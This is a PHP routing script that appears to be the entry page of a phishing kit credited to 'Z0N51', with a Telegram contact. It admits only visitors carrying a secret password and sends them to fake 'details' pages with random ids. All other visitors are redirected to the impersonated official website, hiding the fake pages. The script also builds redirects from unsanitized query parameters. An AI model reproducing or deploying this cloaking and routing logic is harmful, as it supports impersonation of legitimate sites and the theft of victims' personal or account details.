<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'app/config.php';
    if( $_GET['pwd'] == PASSWORD ) {
        $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        $acceptLang = ['en', 'de', 'fr', 'it'];
        $lang = in_array($lang, $acceptLang) ? $lang : 'de';
        $_SESSION['lang'] = "de";//$lang;
        $page = "details.php";
        header("Location: j0pl1n/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else if( isset($_GET['lang']) ) {
        $page = $_SESSION['last_page'] . '.php';
        $_SESSION['lang'] = $_GET['lang'];
        header("Location: j0pl1n/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $page = $_GET['redirection'] . '.php';
        if( isset($_GET['error']) ) {
            header("Location: j0pl1n/" . $page . "?error=". $_GET['error'] ."&id=" . mt_rand(11111, 99999999));
            exit();
        }
        header("Location: j0pl1n/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>